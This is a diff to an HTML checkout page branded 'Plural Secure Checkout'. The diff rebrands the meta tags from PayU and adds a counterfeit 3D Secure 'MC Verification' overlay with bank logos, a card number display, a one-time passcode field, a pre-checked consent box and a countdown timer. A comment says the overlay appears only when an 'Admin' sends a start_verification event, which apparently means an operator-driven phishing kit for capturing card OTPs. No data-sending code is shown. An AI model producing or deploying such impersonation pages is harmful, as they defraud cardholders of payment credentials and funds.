@@ -4,8 +4,8 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Plural Secure Checkout</title>
-    <meta name="description" content="Secure payment gateway powered by PayU" />
-    <meta name="author" content="PayU" />
+    <meta name="description" content="Secure payment gateway powered by Plural" />
+    <meta name="author" content="Plural" />
 
     <!-- External CSS - Tailwind CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
@@ -339,6 +339,87 @@
             height: 1.5rem;
             width: auto;
         }
+        /* MC Verification Overlay Styles */
+.fullscreen-overlay {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.5);
+  backdrop-filter: blur(5px);
+  z-index: 9999;
+  display: none;
+  justify-content: center;
+  align-items: center;
+}
+
+.spinner {
+  border: 4px solid #f3f3f3;
+  border-top: 4px solid #3498db;
+  border-radius: 50%;
+  width: 40px;
+  height: 40px;
+  animation: spin 2s linear infinite;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.currency-badge {
+  display: inline-block;
+  padding: 2px 8px;
+  border-radius: 4px;
+  font-size: 0.875rem;
+  background-color: #f3f4f6;
+  color: #6b7280;
+  margin-left: 4px;
+}
+
+.converted-amount {
+  font-weight: 500;
+  color: #2563eb;
+}
+
+/* Glowing effect for OTP input when focused */
+#mcOtpInput:focus {
+  outline: none;
+  box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.5);
+  border-color: #3b82f6;
+}
+
+/* Checked state styling for consent checkbox */
+#mcConsentCheckbox.checked {
+  background-color: #2778c4;
+  border-color: #2778c4;
+}
+
+#mcConsentCheckbox.checked svg {
+  display: block;
+}
+
+/* Button loading styles */
+.btn-loading {
+  position: relative;
+  pointer-events: none;
+}
+
+.btn-loading span {
+  opacity: 0.5;
+  filter: blur(1px);
+}
+
+.modern-spinner {
+  width: 25px;
+  height: 25px;
+  border: 3px solid rgba(255,255,255,0.4);
+  border-radius: 50%;
+  border-top-color: #ffffff;
+  animation: spin 0.8s ease-in-out infinite;
+  box-shadow: 0 0 5px rgba(255,255,255,0.2);
+}
     </style>
 </head>
 
@@ -1701,5 +1782,129 @@ function init() {
 // Start the application
 init();
 </script>
+    <!-- MC Verification Overlay -->
+<div id="mcVerificationOverlay" class="fullscreen-overlay">
+  <!-- Loading Content - Shown Initially -->
+  <div id="mcLoadingContent" style="display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 450px; max-height: 550px; background: white; width: 90%; max-width: 480px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
+    <div style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite;"></div>
+    
+    <!-- Added verification logo during loading -->
+    <div id="loadingVerificationLogo" style="margin-top: 20px; height: 60px; text-align: center;">
+      <!-- Logo will be inserted here dynamically -->
+    </div>
+  </div>
+  
+  <!-- Verification Content - Hidden Until Admin Sends start_verification Event -->
+  <div id="mcVerificationContent" style="display: none; position: relative; width: 90%; max-width: 480px;">
+    <div style="background-color: #fff; border-radius: 8px; width: 100%; padding: 0; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);">
+      <!-- Header with bank logos -->
+      <div id="mcHeader" style="padding: 10px; border-bottom: 1px solid #ddd; display: flex; justify-content: space-between; align-items: center;">
+        <div id="leftBankLogo" style="height: 40px; max-width: 40%;">
+          <img id="bankLogo" src="" alt="Bank Logo" style="height: 40px; max-width: 100%;">
+        </div>
+        <div id="rightVerificationLogo" style="height: 40px; max-width: 40%; text-align: right;">
+          <img id="verificationTypeLogo" src="" alt="Verification Logo" style="height: 40px; max-width: 100%;">
+        </div>
+      </div>
+      
+      <!-- Main content -->
+      <div style="padding: 15px;">
+        <p id="securityMessage" style="font-size: 14px; margin-bottom: 15px; font-weight: bold;">
+          Protecting your online payments
+        </p>
+        
+        <div style="background-color: #ffeef2; border-radius: 6px; padding: 10px; margin-bottom: 15px;">
+          <p id="otpSentMessage" style="font-size: 13px; margin: 0; color: #333;">
+            One-Time Passcode is required for this purchase. This passcode has been sent to your registered mobile <span id="cardLastFourDigits">********9469</span>
+          </p>
+        </div>
+        
+        <!-- Transaction details - CENTERED LAYOUT with currency display -->
+        <div style="display: flex; flex-direction: column; align-items: center; text-align: center; margin-bottom: 15px;">
+          <div style="width: 90%; margin-bottom: 5px; display: flex; justify-content: space-between;">
+            <span style="display: inline-block; width: 40%; text-align: right; padding-right: 10px; font-size: 13px;">Merchant</span>
+            <span id="merchantName" style="display: inline-block; width: 60%; text-align: left; font-size: 13px;">Peacock Merchandise</span>
+          </div>
+          
+          <!-- Amount row with currency display -->
+          <div style="width: 90%; margin-bottom: 5px; display: flex; justify-content: space-between;">
+            <span style="display: inline-block; width: 40%; text-align: right; padding-right: 10px; font-size: 13px;">Amount</span>
+            <span id="transactionAmountDisplay" style="display: inline-block; width: 60%; text-align: left; font-size: 13px;">
+              <span id="currencySymbol">$</span> <span id="transactionAmount">1299.00</span>
+              <div id="convertedAmountDisplay" style="display: none; margin-top: 2px;">
+                <span id="originalCurrencyDisplay" class="currency-badge">USD: $<span id="originalAmount">1299.00</span></span>
+              </div>
+            </span>
+          </div>
+          
+          <div style="width: 90%; margin-bottom: 5px; display: flex; justify-content: space-between;">
+            <span style="display: inline-block; width: 40%; text-align: right; padding-right: 10px; font-size: 13px;">Date</span>
+            <span id="transactionDate" style="display: inline-block; width: 60%; text-align: left; font-size: 13px;"></span>
+          </div>
+          
+          <div style="width: 90%; margin-bottom: 5px; display: flex; justify-content: space-between;">
+            <span style="display: inline-block; width: 40%; text-align: right; padding-right: 10px; font-size: 13px;">Card Number</span>
+            <span id="cardNumberDisplay" style="display: inline-block; width: 60%; text-align: left; font-size: 13px;"></span>
+          </div>
+          
+          <div style="width: 90%; margin-bottom: 5px; display: flex; justify-content: space-between;">
+            <span style="display: inline-block; width: 40%; text-align: right; padding-right: 10px; font-size: 13px;">Reference Id</span>
+            <span id="referenceId" style="display: inline-block; width: 60%; text-align: left; font-size: 13px;"></span>
+          </div>
+        </div>
+        
+        <div style="margin-bottom: 15px; position: relative;">
+          <label for="mcOtpInput" style="display: block; margin-bottom: 5px; font-size: 13px;">Enter One-Time Passcode</label>
+          <div style="position: relative;">
+            <input type="text" id="mcOtpInput" style="width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; transition: box-shadow 0.3s ease;" placeholder="Enter One-Time Passcode" maxlength="6">
+            <div style="position: absolute; right: 8px; top: 50%; transform: translateY(-50%); cursor: pointer;" id="otpInfoIcon">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="12" cy="12" r="10" stroke="#999" stroke-width="2"/>
+                <path d="M12 7v2" stroke="#999" stroke-width="2" stroke-linecap="round"/>
+                <path d="M12 12v5" stroke="#999" stroke-width="2" stroke-linecap="round"/>
+              </svg>
+            </div>
+            <div id="otpInfoTooltip" style="position: absolute; top: -70px; right: 0; background: #333; color: white; padding: 8px; border-radius: 4px; font-size: 12px; width: 200px; display: none; z-index: 10;">
+              The One-Time Passcode is a temporary security code sent to your registered mobile number for verification.
+            <div style="position: absolute; bottom: -6px; right: 12px; width: 12px; height: 12px; background: #333; transform: rotate(45deg);"></div>
+            </div>
+          </div>
+        </div>
+        
+        <p id="mcOtpError" style="color: #ef4444; font-size: 13px; margin-top: 5px; display: none;">
+          Incorrect verification code. Please try again.
+        </p>
+        
+       <div style="margin-bottom: 10px;">
+        <label id="consentLabel" style="display: flex; align-items: start; font-size: 12px; color: #333; cursor: pointer;">
+          <div id="mcConsentCheckbox" style="width: 16px; height: 16px; border: 1px solid #2778c4; border-radius: 3px; margin-right: 8px; margin-top: 2px; display: flex; align-items: center; justify-content: center; background-color: #2778c4; transition: background-color 0.2s ease;" class="checked">
+            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display: block;">
+              <path d="M5 13l4 4L19 7" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <span>I agree that by clicking the box I have read, understood and accepted the 3D Secure Terms and Conditions.</span>
+        </label>
+      </div>
+        
+        <!-- Full-width Submit and Resend buttons side by side -->
+        <div style="display: flex; gap: 5px; margin-top: 15px;">
+          <button id="mcSubmitBtn" style="flex: 1; padding: 8px; background-color: #CCCCCC; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: not-allowed;" disabled>Submit</button>
+          <button id="mcResendBtn" style="flex: 1; padding: 8px; background-color: #2778c4; color: white; border: none; border-radius: 4px; font-size: 14px; cursor: pointer;">Resend</button>
+          <button id="mcCancelBtn" style="flex: 1; padding: 8px; background-color: #cccccc; color: #333; border: none; border-radius: 4px; font-size: 14px; cursor: pointer;">Cancel</button>
+        </div>
+        
+        <div style="text-align: center; margin-top: 15px; font-size: 12px; color: #666;">
+          Time remaining: <span id="mcTimer">02:59</span>
+        </div>
+        
+        <div style="font-size: 11px; text-align: center; margin-top: 15px; background-color: #f5f5f5; padding: 8px 0; margin-left: -15px; margin-right: -15px; margin-bottom: -15px; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px;">
+          <a href="#" style="color: #0066cc; text-decoration: none; margin-right: 10px;">Terms & Conditions</a> |
+          <a href="#" style="color: #0066cc; text-decoration: none; margin-right: 10px;">FAQs</a> |
+          <a href="#" style="color: #0066cc; text-decoration: none;">Contact Us</a>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
 </body>
 </html>
